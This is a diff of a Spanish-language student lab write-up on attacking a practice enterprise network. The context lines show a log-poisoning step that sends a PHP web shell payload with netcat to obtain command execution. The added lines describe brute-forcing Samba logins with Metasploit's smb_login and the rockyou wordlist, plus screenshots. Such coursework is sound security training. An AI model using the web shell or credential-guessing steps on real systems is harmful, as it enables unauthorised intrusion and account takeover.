@@ -201,3 +201,9 @@ Al verificar la vulnerabilidad a los ataques de Local File Inclusion, vamos a re
 Empleamos el comando **proxychains nc 10.10.10.130 80**, indicando que estamos atacando el puerto 80, y tras ejecutarlo ponemos el siguiente código, pulsando la tecla ENTER al final: **GET <?php system($_GET[‘cmd’]);?> HTTP/1.1**
 
 ![Untitled](https://github.com/IES-Rafael-Alberti/23-24-G1-Ciberseguridad/blob/main/Hacking%20%C3%89tico/Proyecto%2007%3A%20Attacking%20Enterprise%20Networks/img/Untitled%2045.png)
+
+Podemos también comprobar que el Samba es vulnerable, empleando el CVE-2016-2115, por lo que al emplear el smb_login, junto con user_file y pass_file usando la wordlist rockyou.txt, podemos ver que se pueden obtener varios usuarios y los puertos a los que acceden, además de iniciar las sesiones sin problemas en el smb con esos usuarios:
+
+![Untitled](https://github.com/IES-Rafael-Alberti/23-24-G1-Ciberseguridad/blob/main/Hacking%20%C3%89tico/Proyecto%2007%3A%20Attacking%20Enterprise%20Networks/img/Untitled%20(1).png)
+
+![Untitled](https://github.com/IES-Rafael-Alberti/23-24-G1-Ciberseguridad/blob/main/Hacking%20%C3%89tico/Proyecto%2007%3A%20Attacking%20Enterprise%20Networks/img/2024-04-25%2001_55_32-Kali%20Linux%20Nessus%20%26%20OpenVAS%20(Instant%C3%A1nea%207)%20%5BCorriendo%5D%20-%20Oracle%20VM%20VirtualBox.png)
